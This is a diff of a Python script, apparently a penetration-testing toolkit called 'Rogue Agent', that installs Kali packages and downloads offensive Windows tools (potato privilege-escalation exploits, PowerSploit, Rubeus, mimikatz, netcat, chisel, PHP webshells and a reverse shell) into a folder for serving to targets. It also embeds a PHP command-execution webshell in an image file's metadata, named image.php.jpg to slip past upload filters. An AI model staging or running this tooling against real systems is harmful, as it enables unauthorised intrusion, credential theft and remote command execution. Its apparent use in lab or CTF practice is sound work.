@@ -2,7 +2,7 @@
 # coding:UTF-8
 
 # -------------------------------------------------------------------------------------
-#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF MICROSOFT SERVERS
+#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
 #         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
 # -------------------------------------------------------------------------------------
 
@@ -19,13 +19,26 @@ import sys
 import os.path
 import shutil
 
-network = "tun0"	# CHANGE AS NECESSARY
+network = "tun0"	# USER NEEDS TO CHANGE THIS AS APPROPRIATE
+
+def banner():
+   print("\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   ")
+   print("\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  ")
+   print("\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    ")
+   print("\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    ")
+   print("\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|  ") 
+   print("\t\t                                                                  ")
+   print("\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)        \n\n")
+   return
 
 # -------------------------------------------------------------------------------------
 # SYSTEM REQUIREMENTS
 # -------------------------------------------------------------------------------------
 
-print("[+] Loading requirements...\n")
+os.system("clear")
+banner()
+print("[+] Loading Kali linux requirements...\n")
+
 os.system("apt-get install seclists -y")
 os.system("apt-get install python3-pip -y")
 os.system("apt-get install python3-ldap -y")
@@ -46,11 +59,14 @@ os.system("git clone https://github.com/ropnop/windapsearch.git")
 os.system("mv windapsearch/windapsearch.py /usr/share/doc/python3-impacket/examples/windapsearch.py")
 shutil.rmtree("windapsearch")
 
-os.system("clear")
-
 # -------------------------------------------------------------------------------------
 # EXPLOITS
 # -------------------------------------------------------------------------------------
+
+os.system("clear")
+banner()
+print("[+] Loading Kali linux requirements...")
+print("[+] Loading exploit files...\n")
 
 if not os.path.exists("HTTPFILES"):
    os.system("mkdir HTTPFILES")
@@ -78,6 +94,7 @@ os.system("mv ./Lovely-Potato/JuicyPotato-Static.exe ./juicypotato.exe")
 os.system("mv ./Lovely-Potato/test_clsid.bat ./")
 os.remove("./Lovely-Potato/README.md")
 shutil.rmtree("Lovely-Potato")
+
 os.system("wget 'https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip' -O RoguePotato.zip")
 os.system("unzip RoguePotato.zip")
 os.remove("RoguePotato.zip")
@@ -93,12 +110,6 @@ os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfil
 os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1' -O powerview.ps1")
 os.system("wget 'https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1' -O powermad.ps1")
 
-os.system("wget 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -O rubeus.exe")
-os.system("wget 'https://nmap.org/dist/nmap-7.80-setup.exe' -O nmapsetup.exe")
-os.system("cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe")
-os.system("cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe")
-os.system("cp /usr/share/windows-resources/binaries/nc.exe nc64.exe")
-os.system("cp /usr/share/windows-resources/binaries/plink.exe plink64.exe")
 os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz' -O chisel.gz")
 os.system("gunzip chisel.gz")
 os.system("mv chisel chisel64.exe")
@@ -106,12 +117,23 @@ os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chi
 os.system("gunzip chisel.gz")
 os.system("mv chisel chisel32.exe")
 
+os.system("wget 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -O rubeus.exe")
+os.system("wget 'https://nmap.org/dist/nmap-7.80-setup.exe' -O nmapsetup.exe")
+
+os.system("cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe")
+os.system("cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe")
+
+os.system("cp /usr/share/windows-resources/binaries/nc.exe nc64.exe")
+os.system("cp /usr/share/windows-resources/binaries/plink.exe plink64.exe")
+
+
 os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php")
+os.system("wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O myshell.php")
+
 os.system("touch image.jpg")
 command = "<h1>IMAGE SHELL<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';}  __halt_compiler();?></h1>"
 os.system("exiftool -DocumentName=" + command + " image.jpg")
 os.system("mv image.jpg image.php.jpg")
-os.system("wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O myshell.php")
 
 os.system("ifconfig " + network +  " | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt")
 with open("file.txt", "r") as read:
@@ -122,6 +144,11 @@ os.remove("file.txt")
 
 os.system("wget 'https://github.com/BroadbentT/WIN-HTTP-SERVER/blob/master/template.txt' -O template.txt")
 os.chdir("..")
-print("good job!! all done..")
+
+os.system("clear")
+banner()
+print("[+] Loading Kali linux requirements...")
+print("[+] Loading exploit files...")
+print("[+] Good job!! all done...")
 
 #Eof
